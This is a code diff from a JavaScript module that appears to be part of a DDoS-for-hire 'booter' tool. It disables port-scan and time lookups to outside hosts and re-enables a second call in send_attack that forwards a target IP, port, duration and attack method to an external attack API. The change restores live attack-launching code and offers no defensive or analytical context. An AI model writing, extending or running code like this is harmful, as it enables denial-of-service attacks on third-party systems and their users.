@@ -72,16 +72,20 @@ exports.GeoIP = async function(ip) {
 *@type: [<string>]
 */
 exports.pScan = async function(ip) {
-    let results = await(await fetch("https://scrapy.tech/pscan.php?ip="+ ip)).text();
-    return results;
+    // let results = await(await fetch("https://scrapy.tech/pscan.php?ip="+ ip)).text();
+    // return results;
+
+    return "Current Disabled!";
 }
 
 /*
 *@type: void
 */
 exports.currentTime = async function() {
-    let gangshit = await(await fetch("https://traumatized.tech/time.php")).text();
-    return gangshit;
+    // let gangshit = await(await fetch("https://traumatized.tech/time.php")).text();
+    // return gangshit;
+
+    return "Current Disabled!";
 }
 
 /*
@@ -135,9 +139,9 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     console.log(rreturn);
     response += "API 1: " + await eExtra.get_api_response(rreturn) + "\r\n";
     
-    // let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    // console.log(rreturn1);
-    // response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";
+    let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    console.log(rreturn1);
+    response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";
 
     return response;
 }
